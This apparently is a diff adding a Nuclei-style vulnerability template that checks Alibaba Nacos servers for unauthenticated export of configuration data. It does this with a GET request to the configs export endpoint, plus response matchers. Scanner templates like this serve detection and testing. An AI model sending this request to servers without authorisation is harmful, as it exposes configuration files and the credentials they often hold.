@@ -1,0 +1,24 @@
+id: nacos-download-config
+
+info:
+  name: Nacos configs export - Unauthorized
+  author: qwtd
+  severity: high
+  description: Nacos未授权下载配置信息. 
+  reference: https://wiki.wy876.cn/#/./Nacos/Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8B%E8%BD%BD%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF
+  tags: Alibaba-Nacos
+  metadata:
+    max-request: 1
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId="
+      - "{{BaseURL}}/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId="
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"totalCount","pagesAvailable")  && status_code==200'
+          - 'contains(header,"gzip") && status_code==200'
